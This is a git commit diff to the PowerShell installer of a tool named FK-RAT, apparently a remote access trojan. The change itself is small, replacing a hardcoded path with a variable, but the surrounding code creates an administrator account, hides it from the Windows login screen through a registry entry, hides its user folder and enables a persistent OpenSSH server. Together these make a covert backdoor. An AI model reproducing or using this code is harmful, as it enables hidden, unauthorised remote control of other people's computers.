3f1080a1023383ac93982e3afaacf7b7e9acdd87
Sunnickel <alexanderreiter20@gmail.com>
2023-10-30 12:46:24 +0100

    sad

--- files/installer.ps1
+++ files/installer.ps1
@@ -45,7 +45,7 @@ createAdmin -uName $uName -pWord $pWord
 ## Hide FK-RAT User (Admin)
 New-Item -Path $rPath -Force
 New-ItemProperty -Path $rPath -Name $uName -Value 00000000
-Get-Item "C:\Users\fk-rat" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
+Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
 
 ## Enable persistent SSH
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
